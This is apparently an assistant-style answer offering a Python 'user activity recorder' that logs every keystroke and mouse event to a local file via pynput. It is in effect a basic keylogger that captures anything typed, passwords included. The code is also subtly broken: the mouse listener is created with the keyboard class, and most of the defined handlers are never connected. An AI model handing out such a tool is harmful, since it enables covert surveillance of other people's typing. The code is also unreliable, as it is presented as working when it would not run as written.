**User Activity Recorder Program**

This program will record user activity, including keyboard and mouse events. Please note that this program will require administrative privileges to run.

```python
import pynput
from pynput import keyboard
import logging
import threading
import time

# Set up logging
logging.basicConfig(filename='activity.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    logging.info(f'Key pressed: {key}')

def on_release(key):
    logging.info(f'Key released: {key}')

def on_move(x, y):
    logging.info(f'Mouse moved to ({x}, {y})')

def on_click(x, y, button, pressed):
    if pressed:
        logging.info(f'Mouse button {button} clicked at ({x}, {y})')
    else:
        logging.info(f'Mouse button {button} released at ({x}, {y})')

def on_scroll(x, y, dx, dy):
    logging.info(f'Mouse scrolled {dx} units horizontally and {dy} units vertically at ({x}, {y})')

def on_text(text):
    logging.info(f'Text typed: {text}')

def on_write(text):
    logging.info(f'Text written: {text}')

def on_char(text):
    logging.info(f'Character typed: {text}')

def on_move_window(x, y):
    logging.info(f'Window moved to ({x}, {y})')

def on_close():
    logging.info('Window closed')

def on_activate():
    logging.info('Window activated')

def on_deactivate():
    logging.info('Window deactivated')

def on_activate_app(app_id):
    logging.info(f'App activated: {app_id}')

def on_deactivate_app(app_id):
    logging.info(f'App deactivated: {app_id}')

# Set up keyboard listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Set up mouse listener
listener_mouse = keyboard.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
listener_mouse.start()

# Run indefinitely
while True:
    time.sleep(1)
```

This program uses the `pynput` library to record user activity. It logs all keyboard and mouse events to a file named `activity.log`. You can customize the logging format and level to suit your needs.

